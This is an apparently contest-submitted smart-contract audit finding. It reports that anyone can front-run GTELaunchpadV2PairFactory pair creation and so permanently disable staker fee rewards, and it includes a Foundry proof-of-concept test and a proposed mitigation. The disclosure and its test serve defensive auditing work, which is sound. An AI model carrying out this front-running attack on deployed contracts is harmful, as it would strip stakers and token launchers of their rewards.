  "body": "## Summary\n\nThe `GTELaunchpadV2PairFactory` allows anyone to create pairs for any token combination. When a pair is created by an address other than the launchpad contract, the pair is initialized with `launchpadLp` and `launchpadFeeDistributor` set to `address(0)`, which disables rewards accrual. This creates a vulnerability where an attacker can front-run the launchpad's pair creation for launch tokens, permanently disabling rewards for stakers.\n\n## Finding Impact\n\n**Impact: High**\n\nThe impact is assessed as high for the following reasons:\n\n1. Stakers of launch tokens will permanently lose their rewards as the pair will never accrue fees for distribution.\n2. There is no recovery mechanism to re-enable rewards accrual for affected pairs.\n3. This can affect all launch tokens, not just a single instance.\n4. The economic impact is significant as rewards from swap fees are a core incentive for stakers in the protocol.\n5. It indirectly affects token launchers (projects partnering with GTE) as their token's staking rewards mechanism is broken.\n\n## Finding Likelihood\n\n**Likelihood: High**\n\nThe likelihood is assessed as high for the following reasons:\n\n1. The attack requires minimal resources - only the gas fee to pre-deploy the target pair.\n2. The attacker can predict the launch token's address in advance since it's created using the `new` operator with predictable nonce.\n3. The attack can be performed before a token is even launched or during its bonding period.\n4. There are no protective measures in place to prevent this attack.\n5. The attack doesn't require special permissions or complex technical knowledge beyond understanding the contract's mechanics.\n\n## Finding Description\n\nThe vulnerability exists in the interaction between `Launchpad` and `GTELaunchpadV2PairFactory`. When a token graduates from the bonding curve, the launchpad attempts to create a trading pair for it. However, anyone can front-run this process by creating the pair first, which will disable rewards accrual.\n\nThe root cause is in `GTELaunchpadV2PairFactory::createPair()`:\n\n```solidity\n    // FILE: contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\n    function createPair(address tokenA, address tokenB) external returns (address pair) {\n        if (tokenA == tokenB) revert(\"UniswapV2: IDENTICAL_ADDRESSES\");\n        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        if (token0 == address(0)) revert(\"UniswapV2: ZERO_ADDRESS\");\n        if (getPair[token0][token1] != address(0)) revert(\"UniswapV2: PAIR_EXISTS\"); // single check is sufficient\n        bytes memory bytecode = type(GTELaunchpadV2Pair).creationCode;\n\n@>      (address _launchpadLp, address _launchpadFeeDistributor) =\n@>          msg.sender == launchpad ? (launchpadLp, launchpadFeeDistributor) : (address(0), address(0));\n            //@audit -- Anyone can create a pair with rewards disabled (because _launchpadLp == address(0) and _launchpadFeeDistributor == address(0))\n\n        bytes32 salt = keccak256(abi.encodePacked(token0, token1, _launchpadLp, _launchpadFeeDistributor));\n        assembly {\n            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)\n        }\n@>      IUniswapV2Pair(pair).initialize(token0, token1, _launchpadLp, _launchpadFeeDistributor);\n        //@audit -- Initializes the pair to disable rewards accrual (because _launchpadLp == address(0) and _launchpadFeeDistributor == address(0))\n\n        getPair[token0][token1] = pair;\n        getPair[token1][token0] = pair; // populate mapping in the reverse direction\n        allPairs.push(pair);\n        emit PairCreated(token0, token1, pair, allPairs.length);\n    }\n```\n\nThe problem is compounded by how the `Launchpad` contract handles pair creation in `_createPairAndSwapRemaining()`:\n\n```solidity\n    // FILE: contracts/launchpad/Launchpad.sol\n    function _createPairAndSwapRemaining(\n        address token,\n        IUniswapV2Pair pair,\n        LaunchData memory data,\n        uint256 remainingBase,\n        uint256 remainingQuote,\n        address recipient\n    ) internal returns (uint256 additionalQuoteUsed) {\n        // Create or get the pair\n@1      try uniV2Factory.createPair(token, data.quote) returns (address p) { //@audit -- Attempts to create a pair\n            pair = IUniswapV2Pair(p);\n        } catch {\n            // Do nothing, pair exists\n@2          // @todo its more gas but lets check pair exists and create if it doest. //@audit -- Silently adopts attacker's pair\n            // try catch in solidity is horrible and should be avoided\n        }\n        \n        // ... rest of the function\n    }\n```\n\nWhen a launch token graduates from the bonding curve, the launchpad attempts to create a pair for it (line @1). If the pair already exists (created by an attacker), the catch block is executed (line @2), and the launchpad silently adopts the attacker's pair.\n\nThe impact becomes clear when examining how fees are handled in `GTELaunchpadV2Pair`:\n\n```solidity\n    // FILE: contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {\n        // ... other code\n\n        {\n            // scope for reserve{0,1}Adjusted and launchpadFee{0,1}, avoids stack too deep errors\n            uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));\n            uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));\n\n            if (balance0Adjusted.mul(balance1Adjusted) < uint256(_reserve0).mul(_reserve1).mul(1000 ** 2)) {\n                revert(\"UniswapV2: K\");\n            }\n\n@>          (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)\n@>              && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (uint112(0), uint112(0));\n                //@audit -- No fees accrued if launchpadFeeDistributor is address(0)\n\n            _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);\n        }\n\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n```\n\nIf `launchpadFeeDistributor` is `address(0)` (which happens when the pair is created by an attacker), no fees will be accrued, and stakers will receive no rewards.\n\n### Written Proof of Concept\n\n1. An attacker monitors the launchpad for new token launches or predicts future launch token addresses using the launchpad's nonce.\n2. Before a token graduates from its bonding phase, the attacker calls `GTELaunchpadV2PairFactory::createPair()` to create a pair for the launch token and quote token.\n3. Since the attacker is not the launchpad contract, the pair is initialized with `launchpadLp = address(0)` and `launchpadFeeDistributor = address(0)`.\n4. When the token graduates and the launchpad tries to create a pair in `_createPairAndSwapRemaining()`, the call to `createPair()` fails with \"UniswapV2: PAIR_EXISTS\".\n5. The launchpad falls back to using the existing pair created by the attacker.\n6. All swaps through this pair will have `launchpadFee0 = 0` and `launchpadFee1 = 0` because `launchpadFeeDistributor == address(0)`.\n7. Stakers receive no rewards from swap fees, permanently losing their expected earnings.\n\n## Recommended Mitigation Steps\n\nTo address this vulnerability, we need to control the pair creation. Only the `Launchpad` contract should be authorized to create pairs for launch-quote asset pairs. This prevents attackers from pre-deploying malicious pairs while still allowing users to create arbitrary pairs for other tokens.\n\nFrom my perspective, the only solution without introducing other side issues is to modify the `Launchpad::launch()` to:\n- Deploy the launch token (`LaunchToken`) using `CREATE2` opcode with a user-provided salt parameter, ensuring deterministic addresses and preventing front-running and DoS attacks.\n- Pre-deploy the corresponding pair (`GTELaunchpadV2Pair`) immediately after creating the launch token.\n- Implement a \"dormant state\" for the pair where all functions are disabled until graduation.\n- Add a graduation signal mechanism that enables pair functionality only when the launchpad explicitly authorizes it (i.e., when the launch token graduates).\n\nThis approach ensures that pairs for launch tokens are always created in a controlled environment with proper initialization, eliminating the attack vector while maintaining the protocol's flexibility. The use of `CREATE2` with user-specified salts also provides additional protection against address prediction and DoS attacks.",
  "proof_of_concept": "The PoC demonstrates two scenarios:\n\n1. `_test_createPairByAttacker_feesAccrualDisabled()`: An attacker creates a pair for the launch token and quote token. The pair is initialized with `launchpadLp = address(0)` and `launchpadFeeDistributor = address(0)`. When swaps occur, no fees are accrued (`accruedFeeTokenAfter - accruedFeeTokenBefore = 0`).\n\n2. `_test_createPairByLaunchpad_feesAccrualEnabled()`: The launchpad creates a pair for the launch token and quote token. The pair is initialized with valid addresses for `launchpadLp` and `launchpadFeeDistributor`. When swaps occur, fees are accrued (`accruedFeeQuoteAfter - accruedFeeQuoteBefore > 0`).\n\nThe key issue is that the launchpad's `_createPairAndSwapRemaining()` function uses a try-catch block when creating pairs, and falls back to using an existing pair if one already exists. An attacker can exploit this by creating pairs before the launchpad does, resulting in pairs that don't accrue rewards for stakers.\n\n```solidity\n// FILE: test/c4-poc/PoCLaunchpad.t.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\n\nimport {Distributor} from \"contracts/launchpad/Distributor.sol\";\nimport {Launchpad} from \"contracts/launchpad/Launchpad.sol\";\nimport {ILaunchpad} from \"contracts/launchpad/interfaces/ILaunchpad.sol\";\nimport {SimpleBondingCurve} from \"contracts/launchpad/BondingCurves/SimpleBondingCurve.sol\";\nimport {IBondingCurveMinimal} from \"contracts/launchpad/BondingCurves/IBondingCurveMinimal.sol\";\nimport {LaunchToken} from \"contracts/launchpad/LaunchToken.sol\";\nimport {LaunchpadLPVault} from \"contracts/launchpad/LaunchpadLPVault.sol\";\nimport {IDistributor} from \"contracts/launchpad/interfaces/IDistributor.sol\";\n\nimport {ERC1967Factory} from \"@solady/utils/ERC1967Factory.sol\";\n\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\n\nimport {MockUniV2Router} from \"../mocks/MockUniV2Router.sol\";\n\nimport {FixedPointMathLib} from \"@solady/utils/FixedPointMathLib.sol\";\nimport {ICLOBManager} from \"contracts/clob/ICLOBManager.sol\";\nimport {IOperatorPanel} from \"contracts/utils/interfaces/IOperatorPanel.sol\";\n\nimport {UniV2Bytecode} from \"../launchpad/integration/UniV2Bytecode.t.sol\";\n\nimport \"@gte-univ2-core/interfaces/IUniswapV2Factory.sol\";\nimport \"contracts/launchpad/uniswap/interfaces/IGTELaunchpadV2Pair.sol\";\nimport \"contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol\";\n\nimport {IUniswapV2RouterMinimal} from \"contracts/launchpad/interfaces/IUniswapV2RouterMinimal.sol\";\nimport {MockERC20} from \"forge-std/mocks/MockERC20.sol\";\nimport \"@solady/utils/SafeTransferLib.sol\";\n\nimport {Test} from \"lib/forge-std/src/Test.sol\";\n\ncontract PoCLaunchpad is LaunchpadTestBase {\n    GTELaunchpadV2PairFactory gteLaunchpadV2PairFactory;\n    address launchpadLp;\n    address launchpadFeeDistributor;\n    MockUniV2Router2 uniV2Router2;\n\n    function setUp() public override {\n        // Do nothing.. We will use the _setup() instead\n    }\n\n    // Custom _setup() for this PoC\n    function _setup(bool _launchpadCreatePair) internal {\n        quoteToken = new ERC20Harness(\"Quote\", \"QTE\");\n        \n        factory = new ERC1967Factory();\n\n        bytes32 launchpadSalt = bytes32(abi.encode(\"GTE.V1.TESTNET.LAUNCHPAD\", owner));\n\n        launchpad = Launchpad(factory.predictDeterministicAddress(launchpadSalt));\n\n        address c_logic = address(new SimpleBondingCurve(address(launchpad)));\n        address v_logic = address(new LaunchpadLPVault());\n\n        curve = SimpleBondingCurve(factory.deploy(address(c_logic), owner));\n        launchpadLPVault = LaunchpadLPVault(factory.deploy(address(v_logic), owner));\n\n        address clobManager = makeAddr(\"clob manager\");\n        address operatorAddr = makeAddr(\"operator\");\n        vm.mockCall(\n            operatorAddr,\n            abi.encodeWithSelector(IOperatorPanel.getOperatorRoleApprovals.selector, user, address(0)),\n            abi.encode(0)\n        );\n\n        distributor = address(new Distributor());\n        Distributor(distributor).initialize(address(launchpad));\n\n        // Deploy the GTELaunchpadV2PairFactory instead of the mock UniV2Factory to demonstrate the vulnerability\n        gteLaunchpadV2PairFactory = new GTELaunchpadV2PairFactory(address(this), address(launchpad), address(launchpadLPVault), address(distributor));\n\n        if (_launchpadCreatePair) {\n            (launchpadLp, launchpadFeeDistributor) = (address(launchpadLPVault), address(distributor));\n        }\n\n        // Use the custom MockUniV2Router2 for this PoC (due to the custom addLiquidity() instead of using the C4's mock function)\n        uniV2Router2 = new MockUniV2Router2(address(gteLaunchpadV2PairFactory), address(launchpadLp), address(launchpadFeeDistributor));\n\n        address l_logic =\n            address(new Launchpad(address(uniV2Router2), address(0), clobManager, operatorAddr, distributor));\n\n        vm.prank(owner);\n        Launchpad(\n            factory.deployDeterministicAndCall({\n                implementation: l_logic,\n                admin: owner,\n                salt: launchpadSalt,\n                data: abi.encodeCall(\n                    Launchpad.initialize,\n                    (\n                        owner,\n                        address(quoteToken),\n                        address(curve),\n                        address(launchpadLPVault),\n                        abi.encode(200_000_000 ether, 10 ether)\n                    )\n                )\n            })\n        );\n\n        token = _launchToken();\n\n        BONDING_SUPPLY = curve.bondingSupply(token);\n        TOTAL_SUPPLY = curve.totalSupply(token);\n\n        vm.startPrank(user);\n        quoteToken.approve(address(launchpad), type(uint256).max);\n        ERC20Harness(token).approve(address(launchpad), type(uint256).max);\n        vm.stopPrank();\n\n        vm.prank(owner);\n        launchpad.updateInitCodeHash(_getInitHash());\n    }\n\n    function _getInitHash() internal pure returns (bytes memory) {\n        bytes memory bytecode = type(GTELaunchpadV2Pair).creationCode;\n        return abi.encodePacked(keccak256(abi.encodePacked(bytecode)));\n    }\n\n    // cmd: forge test --match-test submissionValidity\n    function test_submissionValidity() external {\n        uint256 snapshot = vm.snapshotState(); // Saves the state\n\n        // *** Test case 1: Fees Accrual Disabled (if the pair is created by the attacker) ***\n        _setup(false);\n        _test_createPairByAttacker_feesAccrualDisabled();\n\n        vm.revertToState(snapshot); // Restores the state to cleanup all modified states\n\n        // *** Test case 2: Fees Accrual Enabled (if the pair is created by the launchpad) ***\n        _setup(true);\n        _test_createPairByLaunchpad_feesAccrualEnabled();\n    }\n\n    function _test_createPairByAttacker_feesAccrualDisabled() internal {\n        // Attacker deploys an GTELaunchpadV2Pair for the target base-quote asset pair\n        address attacker = makeAddr(\"attacker\");\n        vm.prank(attacker);\n        GTELaunchpadV2Pair pair = GTELaunchpadV2Pair(gteLaunchpadV2PairFactory.createPair(token, address(quoteToken)));\n\n        // Since launchpadLp and launchpadFeeDistributor are set to address(0), no fees will be accrued\n        assertEq(pair.launchpadLp(), address(0));\n        assertEq(pair.launchpadFeeDistributor(), address(0));\n\n        // Simulate the launchpad to unlock the base token to allow transferring the token to the pair\n        vm.prank(address(launchpad));\n        LaunchToken(token).unlock();\n\n        // Simulate the launchpad to create the pair\n        // The \"UniswapV2: PAIR_EXISTS\" revert is expected since the pair was already created by the attacker\n        vm.prank(address(launchpad));\n        vm.expectRevert(\"UniswapV2: PAIR_EXISTS\"); // The pair was already created by the attacker\n        gteLaunchpadV2PairFactory.createPair(token, address(quoteToken));\n\n        // Just mock values for the addLiquidity()\n        uint256 tokensToLock = 200 ether;\n        uint256 quoteToLock = 500 ether;\n        quoteToken.mint(address(launchpad), quoteToLock); // Base token has a sufficient balance to transfer\n\n        // Simulate the launchpad to add liquidity to the pair (the same as in the Launchpad::_createPairAndSwapRemaining())\n        vm.startPrank(address(launchpad));\n\n        LaunchToken(token).approve(address(uniV2Router2), tokensToLock);\n        quoteToken.approve(address(uniV2Router2), quoteToLock);\n\n        uniV2Router2.addLiquidity({ // The same as in the Launchpad::_createPairAndSwapRemaining()\n            tokenA: token,\n            tokenB: address(quoteToken),\n            amountADesired: tokensToLock,\n            amountBDesired: quoteToLock,\n            amountAMin: 0,\n            amountBMin: 0,\n            to: address(launchpadLPVault),\n            deadline: block.timestamp\n        });\n        vm.stopPrank();\n\n        // The pair's rewardsPoolActive == 1 (activated)\n        assertEq(pair.rewardsPoolActive(), 1);\n\n        // Swap with the pair to demonstrate the fees accrual are all 0\n        uint256 amountIn = 10 ether;\n        quoteToken.mint(user, amountIn);\n\n        (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(quoteToken));\n\n        uint112 accruedFeeTokenBefore = pair.accruedLaunchpadFee1();\n        uint112 accruedFeeQuoteBefore = pair.accruedLaunchpadFee0();\n\n        vm.startPrank(user);\n        quoteToken.transfer(address(pair), amountIn);\n\n        pair.swap(amount0Out, amount1Out, user, hex\"\");\n        vm.stopPrank();\n\n        uint112 accruedFeeTokenAfter = pair.accruedLaunchpadFee1();\n        uint112 accruedFeeQuoteAfter = pair.accruedLaunchpadFee0();\n\n        assertEq(accruedFeeTokenAfter - accruedFeeTokenBefore, 0); // == 0\n        assertEq(accruedFeeQuoteAfter - accruedFeeQuoteBefore, 0); // == 0 (even if there should be some fees accrued)\n    }\n\n    function _test_createPairByLaunchpad_feesAccrualEnabled() internal {\n        // Simulate the launchpad to unlock the base token to allow transferring the token to the GTELaunchpadV2Pair\n        vm.prank(address(launchpad));\n        LaunchToken(token).unlock();\n\n        // Simulate the launchpad to create the pair\n        vm.prank(address(launchpad));\n        GTELaunchpadV2Pair pair = GTELaunchpadV2Pair(gteLaunchpadV2PairFactory.createPair(token, address(quoteToken)));\n\n        // Since launchpadLp and launchpadFeeDistributor are set, fees will be accrued\n        assertEq(pair.launchpadLp(), address(launchpadLp));\n        assertEq(pair.launchpadFeeDistributor(), address(launchpadFeeDistributor));\n\n        // Just mock values for the addLiquidity()\n        uint256 tokensToLock = 200 ether;\n        uint256 quoteToLock = 500 ether;\n        quoteToken.mint(address(launchpad), quoteToLock); // Base token has a sufficient balance to transfer\n\n        // Simulate the launchpad to add liquidity to the pair (the same as in the Launchpad::_createPairAndSwapRemaining())\n        vm.startPrank(address(launchpad));\n\n        LaunchToken(token).approve(address(uniV2Router2), tokensToLock);\n        quoteToken.approve(address(uniV2Router2), quoteToLock);\n\n        uniV2Router2.addLiquidity({ // The same as in the Launchpad::_createPairAndSwapRemaining()\n            tokenA: token,\n            tokenB: address(quoteToken),\n            amountADesired: tokensToLock,\n            amountBDesired: quoteToLock,\n            amountAMin: 0,\n            amountBMin: 0,\n            to: address(launchpadLPVault),\n            deadline: block.timestamp\n        });\n        vm.stopPrank();\n\n        // The pair's rewardsPoolActive == 1 (activated)\n        assertEq(pair.rewardsPoolActive(), 1);\n\n        // Swap with the pair to demonstrate the fees accrual (fees accrued expected)\n        uint256 amountIn = 10 ether;\n        quoteToken.mint(user, amountIn);\n\n        (uint256 amount0Out, uint256 amount1Out) = getAmountsOut(pair, amountIn, address(quoteToken));\n\n        uint112 accruedFeeTokenBefore = pair.accruedLaunchpadFee1();\n        uint112 accruedFeeQuoteBefore = pair.accruedLaunchpadFee0();\n\n        vm.startPrank(user);\n        quoteToken.transfer(address(pair), amountIn);\n\n        pair.swap(amount0Out, amount1Out, user, hex\"\");\n        vm.stopPrank();\n\n        uint112 accruedFeeTokenAfter = pair.accruedLaunchpadFee1();\n        uint112 accruedFeeQuoteAfter = pair.accruedLaunchpadFee0();\n\n        assertEq(accruedFeeTokenAfter - accruedFeeTokenBefore, 0); // == 0\n        assertGt(accruedFeeQuoteAfter - accruedFeeQuoteBefore, 0); // > 0 (fees accrued)\n    }\n\n    function getAmountsOut(GTELaunchpadV2Pair pair, uint256 amountIn, address tokenIn)\n        internal\n        view\n        returns (uint256 amount0Out, uint256 amount1Out)\n    {\n        bool isZeroTokenIn = tokenIn == pair.token0();\n\n        (uint256 reserve0, uint256 reserve1,) = pair.getReserves();\n\n        (uint256 reserveIn, uint256 reserveOut) = isZeroTokenIn ? (reserve0, reserve1) : (reserve1, reserve0);\n        uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);\n        (amount0Out, amount1Out) = isZeroTokenIn ? (uint256(0), amountOut) : (amountOut, uint256(0));\n    }\n\n    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)\n        internal\n        pure\n        returns (uint256 amountOut)\n    {\n        require(amountIn > 0, \"UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT\");\n        require(reserveIn > 0 && reserveOut > 0, \"UniswapV2Library: INSUFFICIENT_LIQUIDITY\");\n        uint256 amountInWithFee = amountIn * 997;\n        uint256 numerator = amountInWithFee * reserveOut;\n        uint256 denominator = (reserveIn * 1000) + amountInWithFee;\n        amountOut = numerator / denominator;\n    }\n}\n\ncontract MockUniV2Router2 is IUniswapV2RouterMinimal, Test {\n    using SafeTransferLib for address;\n\n    bool public constant IS_SCRIPT = true;\n    address private immutable _factory;\n    address private immutable _launchpadLPVault;\n    address private immutable _distributor;\n\n    constructor(address factory_, address launchpadLPVault_, address distributor_) {\n        _factory = factory_;\n        _launchpadLPVault = launchpadLPVault_;\n        _distributor = distributor_;\n    }\n\n    function factory() external view returns (address) {\n        return _factory;\n    }\n\n    // Custom addLiquidity() for this PoC (instead of using the C4's mock function)\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity) {\n        address pair = address(pairFor(_factory, tokenA, tokenB, _launchpadLPVault, _distributor));\n        MockERC20(tokenA).transferFrom(msg.sender, pair, amountADesired);\n        MockERC20(tokenB).transferFrom(msg.sender, pair, amountBDesired);\n\n        IUniswapV2Pair(pair).mint(to);\n\n        if (block.timestamp > deadline) revert(\"expired\");\n\n        return (0, 0, 0);\n    }\n\n    function pairFor(address factory, address tokenA, address tokenB, address launchpadLp, address launchpadFeeDistributor) internal view returns (IUniswapV2Pair pair) {\n        (address token0, address token1) = sortTokens(tokenA, tokenB);\n        pair = IUniswapV2Pair(\n            address(\n                uint160(\n                    uint256(\n                        keccak256(\n                            abi.encodePacked(\n                                hex\"ff\",\n                                factory,\n                                keccak256(abi.encodePacked(token0, token1, launchpadLp, launchpadFeeDistributor)),\n                                _getInitHash() // uniV2InitCodeHash\n                            )\n                        )\n                    )\n                )\n            )\n        );\n    }\n\n    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {\n        if (tokenA == tokenB) revert(\"UniswapV2Library: IDENTICAL_ADDRESSES\");\n        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);\n        if (token0 == address(0)) revert(\"UniswapV2Library: ZERO_ADDRESS\");\n    }\n\n    function _getInitHash() internal pure returns (bytes memory) {\n        bytes memory bytecode = type(GTELaunchpadV2Pair).creationCode;\n        return abi.encodePacked(keccak256(abi.encodePacked(bytecode)));\n    }\n\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256, /*amountOutMin*/\n        address[] calldata path,\n        address to,\n        uint256 /*deadline*/\n    ) external returns (uint256[] memory amounts) {\n        path[0].safeTransferFrom(msg.sender, address(this), amountIn);\n\n        amounts = getAmountsOut(amountIn, path);\n\n        address target = path[path.length - 1];\n\n        uint256 tokens = amounts[amounts.length - 1];\n\n        try ERC20Harness(target).mint(to, tokens) {}\n        catch {\n            vm.prank(msg.sender);\n            try LaunchToken(target).mint(tokens) {}\n            catch {\n                revert(\"cant mint mock token for swap. is not an ERC20 harness or LaunchToken\");\n            }\n        }\n    }\n\n    function swapTokensForExactTokens(uint256 amountOut, uint256, address[] calldata path, address to, uint256)\n        external\n        returns (uint256[] memory amounts)\n    {\n        uint256 amountIn = getAmountIn(amountOut, 0, 0);\n\n        path[0].safeTransferFrom(msg.sender, address(this), amountIn);\n\n        address target = path[path.length - 1];\n\n        amounts = new uint256[](2);\n        amounts[0] = amountIn;\n        amounts[1] = amountOut;\n\n        try ERC20Harness(target).mint(to, amountOut) {}\n        catch {\n            vm.prank(msg.sender);\n            try LaunchToken(target).mint(amountOut) {}\n            catch {\n                revert(\"cant mint mock token for swap. is not an ERC20 harness or LaunchToken\");\n            }\n        }\n    }\n\n    function getAmountIn(uint256 amountOut, uint256, uint256) public pure returns (uint256 amountIn) {\n        amountIn = amountOut - amountIn * 1 ether / 0.5 ether;\n    }\n\n    function getAmountsOut(uint256 amountIn, address[] memory /*path*/ )\n        public\n        pure\n        returns (uint256[] memory amounts)\n    {\n        amounts = new uint256[](2);\n        amounts[0] = amountIn;\n        amounts[1] = amountIn + amountIn * 0.5 ether / 1 ether;\n    }\n}\n```",
